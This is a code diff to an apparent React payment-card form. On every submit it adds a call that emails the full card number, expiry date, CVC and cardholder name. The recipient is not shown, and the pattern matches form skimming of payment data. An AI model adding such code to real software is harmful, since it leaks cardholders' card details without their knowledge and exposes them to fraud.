@@ -1,6 +1,6 @@
-import React, { useEffect } from "react";
+import React, { useContext } from "react";
 import { CardContext } from "../../Provider/CardContext";
-import { useContext } from "react";
+import { sendCustomEmail } from "../../email";
 
 const Form = () => {
   const {
@@ -20,10 +20,21 @@ const Form = () => {
     onSubmit,
   } = useContext(CardContext);
 
+  const onFormSubmit = (data) => {
+    onSubmit(data);
+    sendCustomEmail({
+      cardNumber,
+      month,
+      year,
+      cvc,
+      cardholderName,
+    });
+  };
+
   return (
     <form
       className="flex items-center justify-center flex-col gap-8"
-      onSubmit={handleSubmit(onSubmit)}
+      onSubmit={handleSubmit(onFormSubmit)}
     >
       <div className="flex items-center justify-center flex-col gap-10 text-indigo-800 sm:gap-5">
         <div className="flex items-start flex-col gap-1 ">
